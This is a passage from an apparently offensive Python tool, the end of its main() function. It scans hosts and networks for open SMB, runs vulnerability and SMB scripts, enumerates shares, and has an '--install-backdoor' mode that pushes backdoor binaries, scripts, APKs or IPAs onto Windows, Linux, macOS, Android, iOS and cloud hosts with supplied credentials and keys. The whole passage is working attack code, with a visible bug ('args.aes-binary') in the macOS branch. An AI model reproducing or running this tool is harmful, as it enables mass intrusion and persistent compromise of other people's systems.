    p.add_argument("--apk", help="Local path to Android APK payload.")
    p.add_argument("--ipa", help="Local path to iOS IPA payload.")
    args = p.parse_args()

    s = PublicIPFirewallSMB(allowlist=args.allowlist, strategy=args.strategy, timeout=args.timeout, workers=args.workers, verbose=not args.quiet)

    hosts = args.host or []
    if args.input:
        with open(args.input) as f:
            hosts.extend(l.strip() for l in f if l.strip())
    cidrs = args.cidr or []

    if args.reload:
        d = s.load_routes(args.reload)
        if d:
            for r in d:
                x = r.get("details", {}).get("host") or r.get("host")
                if x and x not in hosts:
                    hosts.append(x)

    if not hosts and not cidrs:
        hosts = [str(x) for x in s._ips]
        cidrs = [str(n) for n in s._nets]

    s.scan(hosts, cidrs, async_mode=args.asyncio)

    if args.save or args.reload:
        s.save_routes(args.save or args.reload)

    ok = s.successful_routes()

    for route in ok:
        host = route["host"]
        vuln_info = run_nse_vuln(host)
        smb_info = run_smb_nse(host)
        os_detected = detect_os(host)
        shares = enumerate_samba_shares(host)
        print(f"{host}:{route['port']} open | OS: {os_detected or 'unknown'} | Vulnerabilities: {bool(vuln_info)} | SMB Info: {bool(smb_info)} | Shares: {shares}")
    if args.json:
        print(json.dumps(ok, indent=2))

    if args.install_backdoor:
        missing = []
        if args.remote_os is None:
            missing.append("--remote-os")
        if args.username is None:
            missing.append("--username")
        if args.remote_os in ("linux", "macos", "android", "ios", "aws", "azure", "gcp") and args.share is None:
            missing.append("--share")
        if args.remote_os in ("windows", "linux", "macos", "aws", "azure", "gcp") and (args.key is None or args.server_pubkey is None):
            missing.append("--key/--server-pubkey")
        if args.remote_os in ("windows", "linux", "macos", "aws", "azure", "gcp") and (args.aes_binary is None or args.backdoor_binary is None):
            missing.append("--aes-binary/--backdoor-binary")
        if args.remote_os == "linux" and args.backdoor_script is None:
            missing.append("--backdoor-script")
        if args.remote_os == "macos" and args.backdoor_plist is None:
            missing.append("--backdoor-plist")
        if args.remote_os == "android" and args.apk is None:
            missing.append("--apk")
        if args.remote_os == "ios" and args.ipa is None:
            missing.append("--ipa")
        if args.remote_os in ("aws", "azure", "gcp") and args.backdoor_script is None:
            missing.append("--backdoor-script")
        if missing:
            print("[ERROR] Missing args for --install-backdoor: " + ", ".join(missing), file=sys.stderr)
            sys.exit(1)
        for route in ok:
            host = route["host"]
            print(f"[*] Installing backdoor on {host} [{args.remote_os}] ...")
            success = False
            if args.remote_os == "windows":
                success = install_backdoor_windows(host=host, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes_binary, backdoor_binary_path=args.backdoor_binary, domain=args.domain, use_kerberos=args.use_kerberos)
            elif args.remote_os == "linux":
                success = install_backdoor_linux(host=host, share=args.share, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes_binary, backdoor_binary_path=args.backdoor_binary, backdoor_script_path=args.backdoor_script)
            elif args.remote_os == "macos":
                success = install_backdoor_macos(host=host, share=args.share, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes-binary, backdoor_binary_path=args.backdoor_binary, backdoor_plist_path=args.backdoor_plist)
            elif args.remote_os == "android":
                success = install_backdoor_android(host=host, share=args.share, username=args.username, password=args.password or "", apks_path=args.apk)
            elif args.remote_os == "ios":
                success = install_backdoor_ios(host=host, share=args.share, username=args.username, password=args.password or "", ipas_path=args.ipa)
            elif args.remote_os in ("aws", "azure", "gcp"):
                success = install_backdoor_cloud(host=host, share=args.share, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes_binary, backdoor_binary_path=args.backdoor_binary, backdoor_script_path=args.backdoor_script, cloud_provider=args.remote_os)
            if not success:
                print(f"[!] Backdoor install failed for {host}", file=sys.stderr)
            else:
                print(f"[+] Backdoor install succeeded for {host}")

if __name__ == "__main__":
    main()
